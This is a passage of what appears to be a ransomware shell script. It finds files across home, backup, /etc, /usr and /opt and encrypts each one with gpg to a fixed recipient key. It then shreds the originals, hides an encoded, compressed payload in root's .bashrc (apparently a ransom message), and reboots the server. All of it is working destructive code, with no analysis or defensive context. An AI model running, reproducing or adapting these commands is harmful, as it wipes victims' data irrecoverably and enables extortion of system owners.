...
nohup find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr/lib /usr/share /usr/local /usr/src /opt -type f ! -name '*.ENC' -exec gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
echo H4sIAAAAAAAAA0tNzshX0E1VUOLi4lKAg5B8hZTU5KLKghKFlMSSRAVdXYWCxEqFGBVTAwMDhcw8BafMkuR8IF2Sr2DoVJRbmJJd5Fac7e4ekuYUnmqYVJqcWeZrWe7i5GOWbe4DNFqJCwAACG+XaQAAAA== | base64 -d | gzip -d >> /root/.bashrc
shutdown -r now
